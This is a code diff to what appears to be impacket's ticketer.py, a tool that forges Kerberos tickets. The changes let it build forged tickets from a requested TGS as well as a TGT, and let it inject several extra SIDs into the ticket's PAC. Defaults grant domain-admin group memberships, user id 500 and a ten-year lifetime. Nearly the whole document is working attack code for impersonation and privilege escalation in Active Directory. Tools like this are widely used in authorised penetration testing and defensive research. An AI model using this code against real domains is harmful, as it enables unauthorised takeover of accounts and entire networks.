@@ -70,7 +70,7 @@ from impacket.krb5.pac import KERB_SID_AND_ATTRIBUTES, PAC_SIGNATURE_DATA, PAC_I
     PAC_CLIENT_INFO_TYPE, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, \
     VALIDATION_INFO, PAC_CLIENT_INFO, KERB_VALIDATION_INFO
 from impacket.krb5.types import KerberosTime, Principal
-from impacket.krb5.kerberosv5 import getKerberosTGT
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 
 
 class TICKETER:
@@ -218,7 +218,11 @@ class TICKETER:
 
     def createBasicTicket(self):
         if self.__options.request is True:
-            logging.info('Requesting TGT to target domain to use as basis')
+            if self.__domain == self.__server:
+                logging.info('Requesting TGT to target domain to use as basis')
+            else:
+                logging.info('Requesting TGT/TGS to target domain to use as basis')
+
             if self.__options.hashes is not None:
                 lmhash, nthash = self.__options.hashes.split(':')
             else:
@@ -226,12 +230,15 @@ class TICKETER:
                 nthash = ''
             userName = Principal(self.__options.user, type=PrincipalNameType.NT_PRINCIPAL.value)
             tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
-                                                                    lmhash, nthash, None,
+                                                                    unhexlify(lmhash), unhexlify(nthash), None,
                                                                     self.__options.dc_ip)
             if self.__domain == self.__server:
                 kdcRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
             else:
-                kdcRep = decoder.decode(tgt, asn1Spec=TGS_REP())[0]
+                serverName = Principal(self.__options.spn, type=PrincipalNameType.NT_SRV_INST.value)
+                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain, None, tgt, cipher,
+                                                                        sessionKey)
+                kdcRep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
 
             # Let's check we have all the necessary data based on the ciphers used. Boring checks
             ticketCipher = int(kdcRep['ticket']['enc-part']['etype'])
@@ -421,23 +428,24 @@ class TICKETER:
 
             # Let's add the extraSid
             if self.__options.extra_sid is not None:
+                extrasids = self.__options.extra_sid.split(',')
                 if validationInfo['Data']['SidCount'] == 0:
                     # Let's be sure user's flag specify we have extra sids.
                     validationInfo['Data']['UserFlags'] |= 0x20
                     validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
+                for extrasid in extrasids:
+                    validationInfo['Data']['SidCount'] += 1
 
-                validationInfo['Data']['SidCount'] += 1
+                    sidRecord = KERB_SID_AND_ATTRIBUTES()
 
-                sidRecord = KERB_SID_AND_ATTRIBUTES()
+                    sid = RPC_SID()
+                    sid.fromCanonical(extrasid)
 
-                sid = RPC_SID()
-                sid.fromCanonical(self.__options.extra_sid)
+                    sidRecord['Sid'] = sid
+                    sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
 
-                sidRecord['Sid'] = sid
-                sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
-
-                # And, let's append the magicSid
-                validationInfo['Data']['ExtraSids'].append(sidRecord)
+                    # And, let's append the magicSid
+                    validationInfo['Data']['ExtraSids'].append(sidRecord)
             else:
                 validationInfo['Data']['ExtraSids'] = NULL
 
@@ -524,7 +532,7 @@ class TICKETER:
 
         return encRepPart, encTicketPart, pacInfos
 
-    def signEncryptTicket(self, kdcRep, encASRepPart, encTicketPart, pacInfos):
+    def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):
         logging.info('Signing/Encrypting final ticket')
 
         # We changed everything we needed to make us special. Now let's repack and calculate checksums
@@ -649,15 +657,24 @@ class TICKETER:
 
         # Lastly.. we have to encrypt the kdcRep['enc-part'] part
         # with a key we chose. It actually doesn't really matter since nobody uses it (could it be trash?)
-        encodedEncASRepPart = encoder.encode(encASRepPart)
+        encodedEncASRepPart = encoder.encode(encASorTGSRepPart)
 
-        # Key Usage 3
-        # AS-REP encrypted part (includes TGS session key or
-        # application session key), encrypted with the client key
-        # (Section 5.4.2)
-        sessionKey = Key(cipher.enctype, str(encASRepPart['key']['keyvalue']))
-        logging.info('\tEncASRepPart')
-        cipherText = cipher.encrypt(sessionKey, 3, str(encodedEncASRepPart), None)
+        if self.__domain == self.__server:
+            # Key Usage 3
+            # AS-REP encrypted part (includes TGS session key or
+            # application session key), encrypted with the client key
+            # (Section 5.4.2)
+            sessionKey = Key(cipher.enctype, str(encASorTGSRepPart['key']['keyvalue']))
+            logging.info('\tEncASRepPart')
+            cipherText = cipher.encrypt(sessionKey, 3, str(encodedEncASRepPart), None)
+        else:
+            # Key Usage 8
+            # TGS-REP encrypted part (includes application session
+            # key), encrypted with the TGS session key
+            # (Section 5.4.2)
+            sessionKey = Key(cipher.enctype, str(encASorTGSRepPart['key']['keyvalue']))
+            logging.info('\tEncTGSRepPart')
+            cipherText = cipher.encrypt(sessionKey, 8, str(encodedEncASRepPart), None)
 
         kdcRep['enc-part']['cipher'] = cipherText
         kdcRep['enc-part']['etype'] = cipher.enctype
@@ -684,8 +701,8 @@ class TICKETER:
     def run(self):
         ticket, adIfRelevant = self.createBasicTicket()
         if ticket is not None:
-            encASRepPart, encTicketPart, pacInfos = self.customizeTicket(ticket, adIfRelevant)
-            ticket, cipher, sessionKey = self.signEncryptTicket(ticket, encASRepPart, encTicketPart, pacInfos)
+            encASorTGSRepPart, encTicketPart, pacInfos = self.customizeTicket(ticket, adIfRelevant)
+            ticket, cipher, sessionKey = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)
             self.saveTicket(ticket, sessionKey)
 
 if __name__ == '__main__':
@@ -710,7 +727,7 @@ if __name__ == '__main__':
                         'groups user will belong to (default = 513, 512, 520, 518, 519)')
     parser.add_argument('-user-id', action="store", default = '500', help='user id for the user the ticket will be '
                                                                           'created for (default = 500)')
-    parser.add_argument('-extra-sid', action="store", help='Optional ExtraSid to be included inside the ticket\'s PAC')
+    parser.add_argument('-extra-sid', action="store", help='Comma separated list of ExtraSids to be included inside the ticket\'s PAC')
     parser.add_argument('-duration', action="store", default = '3650', help='Amount of days till the ticket expires '
                                                                             '(default = 365*10)')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
@@ -773,6 +790,7 @@ if __name__ == '__main__':
         executer = TICKETER(options.target, password, options.domain, options)
         executer.run()
     except Exception, e:
-        #import traceback
-        #print traceback.print_exc()
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+            traceback.print_exc()
         print str(e)
